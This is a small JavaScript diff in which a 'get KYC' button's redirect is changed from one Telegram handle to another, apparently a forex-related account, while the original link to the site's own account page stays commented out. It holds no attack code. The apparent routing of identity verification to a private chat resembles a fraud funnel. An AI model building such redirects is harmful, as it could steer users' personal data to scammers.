@@ -47,7 +47,7 @@ inputs.forEach((input, index) => {
 });
 
 get_kyc_btn.addEventListener('click', () => {
-    location.assign("https://t.me/CRISTIN_KYC_VERYFICATION_SUPPORT");
+    location.assign("https://t.me/KAROLINASILVER_FOREX0123");
     // location.assign("{{url('/user/account')}}");
 });
 
